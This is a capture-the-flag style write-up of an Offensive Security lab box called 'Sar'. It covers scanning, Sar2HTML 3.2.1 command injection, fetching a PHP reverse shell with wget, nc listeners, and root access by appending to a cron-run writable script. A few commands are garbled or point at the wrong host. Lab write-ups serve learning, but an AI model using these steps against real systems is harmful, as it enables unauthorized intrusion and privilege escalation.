# offsec-labs-writeups
### Sar


- Vulnerability Exploited: Sar2HTML 3.2.1 - Remote Command Execution 
- System Vulnerable: 192.168.55.35
- Vulnerability Explanation: The vulnerability is due to insufficient sanitizing of user supplied inputs in the application when handling a crafted HTTP request. A remote attacker may be able to exploit this to execute arbitrary commands within the context of the application, via a crafted HTTP request.
- Privilege Escalation Vulnerability:
    - Abusing Cronjob
    - Abusing Writable file permission
- Severity: Critical

An initial scan using nmapAutomator tool revealed Apache httpd 2.4.29 ((Ubuntu)) running on port 80

```javascript
(root@kali)-[/home/kali/nmapAutomator] ./nmapAutomator.sh  192.168.55.35 All
    Running all scans on 192.168.55.35
    Host is likely running Linux
---------------------Starting Port Scan-----------------------

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:50:56:BF:F3:1A (VMware)

---------------------Starting Script Scan-----------------------

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: |   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
|_  256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)MAC Address: 00:50:56:BF:F3:1A (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

the Apache default page is shown below

![1](https://user-images.githubusercontent.com/38728250/194192999-df7a3460-5996-43bf-bbcf-21e83aa95867.png)

running Dirb for directory brute force attack for enumerating web directories:

```javascript
(root@kali)-[/home/kali/nmapAutomator]
 dirb http://192.168.55.35

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Oct  5 21:26:10 2022
URL_BASE: http://192.168.55.35/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.55.35/ ----
+ http://192.168.55.35/index.html (CODE:200|SIZE:10918)                                                        
+ http://192.168.55.35/phpinfo.php (CODE:200|SIZE:95487)                                                       
+ http://192.168.55.35/robots.txt (CODE:200|SIZE:9)                                                            
+ http://192.168.55.35/server-status (CODE:403|SIZE:278)                                                       
                                                                                                               
-----------------
END_TIME: Wed Oct  5 21:26:12 2022
DOWNLOADED: 4612 - FOUND: 4

```

- Let's see what does robots.txt have
![2](https://user-images.githubusercontent.com/38728250/194194345-afc4707f-1a10-40ba-a910-0863919541de.png)

- opening the URL sar2HTML, and the resulting web page displays its default configuration along with version disclosure.
- So, I looked up for its exploit, and i found rce on exploit db.
- The exploit says: In web application you will see index.php?plot url extension.
- Let test first command injection vulnerability
![3](https://user-images.githubusercontent.com/38728250/194197162-062c2164-878c-4daf-83da-ef8ec179f861.png)
python3 is there
- So let's input our own php-reverse-shell from pentestmonkey. The script will open an outbound TCP connection from the webserver to a host and port of specified on the source code. Bound to this TCP connection will be a shell.
    - 1. ``` locate rev.php ``` on the machine /home/kali/rev.php
    - 2. ``` Vim rev.php ``` and edit the port number to 1234
    - 3. and then running the server by Execute ``` python -m SimpleHTTPServer 8008```
    - 4. In the url execute ``` wget+192.168.55.35:8008/rev.php``` for upload the file on the server 
    - 5. testing if the file has been uploaded ```index.php?plot=;ls```, yes it is uploaded 
    - 6. Try to running it and Voila I have got the shell
        - Take the first step by taking a proper terminal shell by the command ```import put:pty.spawn(‘/bin/bash’);```
        - There we go
        - Let’s execute privilege escalation script (LinEnum is one such script that can be incredibly useful for privilege escalation on Linux systems.) on /var/tmp
        - On my machine
            - ```cd tools/LinEnum```


        - And upload the file on the attacked machine by


            - ```Wget http://192.168.55.35/LinEnum.sh```
            - And there we are, and then I run the script and checking for the output and analyzing the data so what all the results we have got by the linux enumeration script.
            - so I found a cron job of a file which is getting executed with ```sudo ./finally.sh``` inside ```/var/www/html``` dir
                - The file ```finally.sh``` has no write permission, On the other hand the ```write.sh``` has the execute permission.
                - So as we have the permissions to ```write.sh``` we upload our shell, php shell to our ```/www/html``` dir.
                - Lets start a reverse http server 
                -  ```python -m SimpleHTTPServer 8008```
                - Update the port on ```rev.php``` to 1337
                - Upload the script in ```/var/www/html$ wget 192.168.55.35:8008/rev.php```
                - Start listen to the port 1337 by ```nc -lvp 1337```
                - ```Echo “php ./rev.php”  >> write.sh```
